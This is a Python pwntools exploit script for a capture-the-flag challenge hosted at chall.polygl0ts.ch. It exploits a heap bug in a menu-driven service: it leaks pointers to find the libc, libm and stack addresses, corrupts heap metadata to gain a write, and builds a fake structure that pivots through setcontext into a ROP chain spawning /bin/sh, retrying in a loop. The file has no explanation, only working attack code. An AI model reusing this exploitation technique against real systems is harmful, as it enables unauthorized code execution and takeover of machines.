from pwn import *

HOST, PORT = 'chall.polygl0ts.ch', 9004
# HOST, PORT = '0.0.0.0', 9004
try:
    r.close()
except:
    pass

def trial():
    r = remote(HOST, PORT)
    context.arch = 'amd64'

    def allocate(size):
        r.sendline(b'1\n%d'%size)


    def read(idx):
        r.sendline(b'3\n%d'%idx)
        r.recvuntil(b'data: \n')
        data = r.recvuntil(b'*EPFL*', drop=True)
        return data

    size = 0x300

    for i in range(2):
        allocate(size)

    data = []
    data.append(read(0))

    pointers = []

    for i, x in enumerate(data):
        if x.strip(b'\x00') != b'':
            print(i, hexdump(x))
            pointers.append(u64(x[:8]))
            pointers.append(u64(x[8:][:8]))
            pointers.append(u64(x[32:][:8]))
            for x in pointers:
                print(hex(x))
            break

    print(hexdump(read(0)))
    try:
        if pointers[2] & 0xfff in (0x288, 0x288):
            next = pointers[2]&~0xfff
            stack = next - 0x21280
            print(hex(next))

            libm = (pointers[2]&~0xfff)+0x17000
            libc = libm + 0x265b000 - 0x28000
            print(hex(libm))
            print(hex(libc))
            next = 0x00000000002214A8 + libc
            next = stack + 0x48
            print(hex(next))

            def write(i, data):
                r.sendline(b'2\n%d'%i)
                r.sendafter(b'data?', data)
            write(0, (p64(pointers[0] + 0x40) + p64(next) + p64(0) * 2 + p64(0) + p64(0x31337)).ljust(64, b'\x00'))
            allocate(size)
            rop_chain=flat(
                [
                    libc+0x11f2e7, 0, 0,
                    libc+0x2be51, 0,
                    libc+0x2a3e5, libc+0x00000000001D8678,
                    libc+0xeb080,libc+0x29f50
                    ]
            )
            setcontext = libc+0x00000000000539E0
            setcontext = libm+0x0000000000013FB0
            write(0, (p64(pointers[0] + 0x40) + p64(next) + p64(0) * 2 + p64(0) + p64(0x31337) + p64(pointers[0] + 0x50) + p64(0x31339)).ljust(64, b'\x00') + flat({
                0: 0,
                0x28: 0,
                0x40: pointers[0] + 0x50 + 0x200,
                0x98: 0x61616161,
                0x200: {
                    0: pointers[0] + 0x50 + 0xb0,
                    8: 100,
                },
                0xb0: {
                    0: pointers[0] + 0x50 + 0xc0
                },
                0xc0: {
                    0: b'/bin/sh\x00',
                    8: setcontext,
                    0x18: 1,
                    0x58: pointers[0] + 0x50 + 0xc8 - 0x20,
                    0xa8: libc + 0x2a3e6,
                    0x128: 1,
                    0xe0: pointers[0],
                    0xa0: pointers[0] + 0x50 + 0x210,
                },
                0x210: rop_chain,
                0x2af: b'\x00'
            }, filler=b'\x00'))
            r.sendline(b'5')
            r.sendlineafter(b'username?', b'a')
            r.sendline(b'6')
            r.interactive()
        else:
            print(hex(pointers[2]&~0xfff))
        r.close()
    except EOFError:
        pass

while True:
    trial()
